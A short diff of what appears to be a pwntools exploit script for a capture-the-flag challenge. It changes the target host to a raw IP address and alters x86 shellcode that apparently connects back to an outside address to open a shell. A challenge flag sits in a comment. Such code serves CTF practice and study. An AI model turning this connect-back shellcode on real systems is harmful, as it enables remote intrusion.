@@ -1,8 +1,9 @@
+#!/usr/bin/env python
 from pwn import *
 
 #FLAG{Ar3_y0u_k1dd1ng_m3}
 
-host = 'ctf.yuawn.idv.tw'
+host = '60.251.236.17'
 port = 10106
 #host = '127.0.0.1'
 #port = 1337
@@ -39,7 +40,7 @@ push   0x1
 pop    ebx
 mov    ecx,esp
 int    0x80
-push   0x88bd738c
+push   0x11ecfb3c
 push   0x39050002
 mov    ecx,esp
 push   0x10
